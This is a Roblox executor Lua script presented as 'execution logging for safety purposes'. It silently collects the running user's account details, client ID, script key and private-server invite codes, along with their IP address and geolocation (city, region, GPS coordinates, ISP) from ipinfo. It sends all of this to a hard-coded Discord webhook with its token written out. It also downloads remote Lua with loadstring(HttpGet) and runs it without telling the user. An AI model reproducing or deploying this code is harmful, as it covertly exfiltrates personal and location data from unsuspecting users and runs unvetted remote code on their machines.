getgenv().whscript = "Script Logs"        
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1439696796686225638/hfg2yu0LrvxZV1Gm74xSI2dKEiNKHzdYdGRZQJDzN4-gZwVCeV5nMfWm1pYIb20nPLHT"
getgenv().ExecLogSecret = true            

if _G.__ERX then
    return
end

_G.__ERX = true

local MainURL = "https://raw.githubusercontent.com/lolthatseazy/FluentLib/refs/heads/main/"
local PrivateMembersURL, PrivateMembers = (MainURL .. "Members.lua"), {}
local AnalyticsService = game:GetService("RbxAnalyticsService")
local clientId = AnalyticsService:GetClientId() 
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local AnalyticsService = game:GetService("RbxAnalyticsService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local executorName = (pcall(identifyexecutor) and identifyexecutor()) or "Unknown Executor"
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

local HttpService = game:GetService("HttpService")
local headshotUrl = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-Default/420/420/AvatarHeadshot/Png/noFilter" 

local success, result = pcall(function()
	local response = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=false")
	return HttpService:JSONDecode(response)
end)

if success and result and result.data and result.data[1] and result.data[1].imageUrl then
	headshotUrl = result.data[1].imageUrl
end

PrivateMembers = PrivateMembers or {}

local WLCheckLocalPlayer = false

local function PlayerWhitelistCheck(Player, UseStatic, Code)
    local suc, err = pcall(function()
        local PlayerHash = (HashLib and HashLib.sha1) and HashLib.sha1(tostring(Player.Name..Player.UserId)) or nil
        local PlayerKey = tostring(Player.Name .. Player.UserId)
        local PlayerId = tonumber(Player.UserId)
        local Members

        if UseStatic and StaticResponse == Code and StaticWhitelist then
            Members = StaticWhitelist
        else
            local response = request({
                Url = PrivateMembersURL,
                Method = "GET"
            })

            if response and response.Body then
                local success, data = pcall(loadstring, "return "..response.Body)
                if success and type(data) == "function" then
                    StaticWhitelist = data()
                else
                    StaticWhitelist = {}
                end
            else
                StaticWhitelist = {}
            end

            StaticResponse = Code
            Members = StaticWhitelist
        end

        if Members then
            for _, entry in ipairs(Members) do
                if type(entry) == "table" then
                    if entry[1] == PlayerKey or (entry[2] and tonumber(entry[2]) == PlayerId) then
                        PrivateMembers[Player.Name] = true
                        break
                    end
                elseif type(entry) == "string" then
                    if entry == PlayerKey or (PlayerHash and entry == PlayerHash) then
                        PrivateMembers[Player.Name] = true
                        break
                    end
                end
            end
        end
    end)

    if Player == LocalPlayer then
        WLCheckLocalPlayer = true
    end

    if not suc then
        warn("Whitelist check failed:", err)
    end

    return suc
end

local function IsCustomPrivate()
    local display = LocalPlayer.DisplayName:lower()
    local userName = "Unknown"

    if LocalPlayer.UserId == 8244720493 then
        userName = "Jay"
    elseif display:find("fuhtwan") then
        userName = "Jay"
    elseif display:find("sandererx") then
        userName = "Sander"
    elseif display:find("77") then
        userName = "Mateymate"
    end

    return userName ~= "Unknown", userName
end

local function GetPrivateStatus(Player)
    PlayerWhitelistCheck(Player, false, "")
    local isCustom, customName = IsCustomPrivate()

    local status = {
        ERXPrivate = PrivateMembers[Player.Name] and "Yes" or "No",
        CustomPrivate = isCustom and ("Yes ("..customName..")") or "No"
    }

    return status
end

local status = GetPrivateStatus(LocalPlayer)

local function readInfoValuesFromReplicatedStorage()
	local results = {
		ServerName = "N/A (Public Server)",
		Code = "N/A (Public Server)",
		OwnerName = "N/A (Public Server)",
		Access = "N/A (Public Server)",
		CoOwnerId = "N/A (Public Server)",
		CoOwnerIds = {"N/A"},
		ELSPack = "N/A (Public Server)",
		PremiumPack = "N/A (Public Server)",
		RoleplayPack = "N/A (Public Server)",
		ServerPack = "N/A (Public Server)",
		Tier = "N/A (Public Server)",
	}

	local success, err = pcall(function()
		local rs = game:GetService("ReplicatedStorage")
		local infoFolder = rs:FindFirstChild("PrivateServers") and rs.PrivateServers:FindFirstChild("Info")
		if not infoFolder or not infoFolder:IsA("Folder") then
			return
		end

		local function getVal(name)
			local o = infoFolder:FindFirstChild(name)
			if not o then return "N/A" end
			if o:IsA("BoolValue") then return tostring(o.Value) end
			if o:IsA("StringValue") then return (o.Value ~= "" and o.Value) or "N/A" end
			if o:IsA("IntValue") or o:IsA("NumberValue") then return tostring(o.Value) end
			return "N/A"
		end

		results.ServerName = getVal("ServerName")
		results.Code = getVal("Code")
		results.OwnerName = getVal("OwnerName")
		results.Access = getVal("Access")
		results.CoOwnerId = getVal("CoOwnerId")
		results.ELSPack = getVal("ELSPack")
		results.PremiumPack = getVal("PremiumPack")
		results.RoleplayPack = getVal("RoleplayPack")
		results.ServerPack = getVal("ServerPack")
		results.Tier = getVal("Tier")

		local coFolder = infoFolder:FindFirstChild("CoOwnerIds")
		if coFolder and coFolder:IsA("Folder") then
			local list = {}
			for _, v in ipairs(coFolder:GetChildren()) do
				if v:IsA("StringValue") then
					if v.Value ~= "" then
						table.insert(list, v.Value)
					end
				end
			end
			if #list > 0 then
				results.CoOwnerIds = list
			end
		end
	end)
	if not success then
		warn("[InfoReader] Failed to read Info folder:", err)
	end
	return results
end

if ui:FindFirstChild(folderName) then
	local ui2 = gethui()
	local folderName2 = "screen2"
	local folder2 = Instance.new("Folder")
	folder2.Name = folderName2
	if not ui2:FindFirstChild(folderName2) then
		folder2.Parent = gethui()
	end
end

if not gethui():FindFirstChild(folderName) then
	folder.Parent = gethui()
end

local players = game:GetService("Players")
local userid = player and player.UserId or "N/A"
local gameid = game.PlaceId
local jobid = tostring(game.JobId)
local gameName = (pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end) and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "N/A"
local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(gameid) .. ", '" .. jobid .. "', player)"
local completeTime = os.date("%Y-%m-%d %H:%M:%S")
local workspace = game:GetService("Workspace")
local screenWidth = (workspace.CurrentCamera and math.floor(workspace.CurrentCamera.ViewportSize.X)) or "N/A"
local screenHeight = (workspace.CurrentCamera and math.floor(workspace.CurrentCamera.ViewportSize.Y)) or "N/A"
local memoryUsage = pcall(function() return game:GetService("Stats"):GetTotalMemoryUsageMb() end) and game:GetService("Stats"):GetTotalMemoryUsageMb() or "N/A"
local playerCount = #players:GetPlayers()
local maxPlayers = players.MaxPlayers
local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
local gameVersion = game.PlaceVersion or "N/A"

task.wait(2) 

local pingValue = "N/A"
pcall(function()
	local serverStats = game:GetService("Stats").Network.ServerStatsItem
	local dataPing = serverStats["Data Ping"]:GetValueString()
	pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
end)

local function checkPremium()
	local premium = "false"
	local ok, response = pcall(function() return player.MembershipType end)
	if ok and response then
		premium = (response ~= Enum.MembershipType.None) and "true" or "false"
	end
	return premium
end

local premium = checkPremium()
local url = getgenv().webhookexecUrl

local privateInfo = readInfoValuesFromReplicatedStorage()

local data = {
	["content"] = "@here",
	["embeds"] = {{
		["title"] = "🚀 **We Logged an Execution**",
		["description"] = "*A script was executed for safety purposes.*",
		["type"] = "rich",
		["color"] = tonumber(0x3498db),
		["fields"] = {
			{
			    ["name"] = "👥 **Private Member?**",
			    ["value"] = ("```ERX Private: %s\nCustom Private: %s```"):format(status.ERXPrivate, status.CustomPrivate),
			    ["inline"] = false
			},
			{
				["name"] = "🔍 **Script Info**",
				["value"] = "```💻 Script Name: " .. tostring(getgenv().whscript or "N/A") .. "\n⏰ Executed At: " .. completeTime .. "```",
				["inline"] = false
			},
			{
				["name"] = "🔑 **Script Key**",
				["value"] = "```" .. tostring(script_key or "N/A") .. "```",
				["inline"] = false
			},
            {
                ["name"] = "💬 **Linked Discord ID**",
                ["value"] = "```" .. tostring(LRM_LinkedDiscordID or "?") .. "```",
                ["inline"] = false
            },
            {
                ["name"] = "🛠️ **Device & Premium Info**",
                ["value"] = "```📱 Device Type: " .. tostring(deviceType) ..
                    "\n💎 Premium User: " .. tostring(LRM_IsUserPremium) .. "```",
                ["inline"] = true
            },
			{
				["name"] = "👤 **Player Details**",
				["value"] = "```🧸 Username: " .. tostring(player and player.Name or "N/A") ..
					"\n📝 Display Name: " .. tostring(player and player.DisplayName or "N/A") ..
					"\n🆔 UserID: " .. tostring(userid) ..
					"\n❤️ Health: " .. tostring(health) .. " / " .. tostring(maxHealth) ..
					"\n🔗 Profile: https://www.roblox.com/users/" .. tostring(userid) .. "/profile```",
				["inline"] = false
			},
			{
				["name"] = "🎮 **Game Details**",
				["value"] = "```🏷️ Game Name: " .. tostring(gameName) ..
					"\n🆔 Game ID: " .. tostring(gameid) ..
					"\n🔢 Game Version: " .. tostring(gameVersion) .. "```",
				["inline"] = false
			},
			{
				["name"] = "🕹️ **Server Info**",
				["value"] = "```👥 Players in Server: " .. tostring(playerCount) .. " / " .. tostring(maxPlayers) ..
					"\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
				["inline"] = true
			},
			{
				["name"] = "📁 **Private Server Info**",
				["value"] = "```🏷️ Server Name: " .. tostring(privateInfo.ServerName) ..
					"\n🔑 Invite Code: " .. tostring(privateInfo.Code) ..
					"\n👑 Owner: " .. tostring(privateInfo.OwnerName) .. "```",
				["inline"] = false
			},
			{
				["name"] = "🧾 **Info: Access & Owners**",
				["value"] = "```🔓 Access: " .. tostring(privateInfo.Access) ..
					"\n👤 CoOwnerId: " .. tostring(privateInfo.CoOwnerId) ..
					"\n👥 CoOwnerIds: " .. table.concat(privateInfo.CoOwnerIds, ", ") .. "```",
				["inline"] = false
			},
			{
				["name"] = "🎛️ **Packs & Tier**",
				["value"] = "```🚘 ELSPack: " .. tostring(privateInfo.ELSPack) ..
					"\n💎 PremiumPack: " .. tostring(privateInfo.PremiumPack) ..
					"\n🎭 RoleplayPack: " .. tostring(privateInfo.RoleplayPack) ..
					"\n🧰 ServerPack: " .. tostring(privateInfo.ServerPack) ..
					"\n🏷️ Tier: " .. tostring(privateInfo.Tier) .. "```",
				["inline"] = false
			},
            {
                ["name"] = "🎒 **Backpack Items**",
                ["value"] = "```" .. table.concat((function()
                    local items = {}
                    if player and player:FindFirstChild("Backpack") then
                        for _, tool in ipairs(player.Backpack:GetChildren()) do
                            table.insert(items, tool.Name)
                        end
                    end
                    return #items > 0 and items or {"No Items"}
                end)(), ", ") .. "```",
                ["inline"] = false
            },
			{
				["name"] = "📡 **Network Info**",
				["value"] = "```📶 Ping: " .. tostring(pingValue) .. " ms```",
				["inline"] = true
			},
			{
				["name"] = "🖥️ **System Info (non-sensitive)**",
				["value"] = "```📺 Resolution: " .. tostring(screenWidth) .. "x" .. tostring(screenHeight) ..
					"\n🔍 Memory Usage (MB): " .. tostring(memoryUsage) .. "```",
				["inline"] = true
			},
            {
                ["name"] = "🔍 **Executor Info**",
                ["value"] = "```⚙️ Executor: " .. tostring(executorName) ..
                            "\n🆔 HWID: " .. tostring(clientId) .. "```",
                ["inline"] = false
            },
			{
				["name"] = "📍 **Character Position**",
				["value"] = "```📍 Position: " .. tostring(position) .. "```",
				["inline"] = true
			},
			{
				["name"] = "🪧 **Join Script**",
				["value"] = "```lua\n" .. snipePlay .. "```",
				["inline"] = false
			},
		},
        ["thumbnail"] = {
            ["url"] = headshotUrl
        },
		["footer"] = {
			["text"] = "Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
			["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
		}
	}}
}

    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**`(🤫) Secret`**",
                ["value"] = "||(👣) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(🌆) Country: " ..
                            ipinfo_table.country ..
                                "||\n||(🪟) GPS Location: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(🏙️) City: " ..
                                            ipinfo_table.city ..
                                                "||\n||(🏡) Region: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
            }
        )
    end

if string.find(string.lower(player.DisplayName), "espn") then
	warn("Fahhh:", player.DisplayName)
	return
end

loadstring(game:HttpGet("https://luraphv2.vercel.app/api/V2.lua"))()

local headers = {["content-type"] = "application/json"}
local requestfn = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
if requestfn then
	pcall(function()
		requestfn({
			Url = url,
			Body = game:GetService("HttpService"):JSONEncode(data),
			Method = "POST",
			Headers = headers
		})
	end)
else
	warn("Just Nutted.")
end
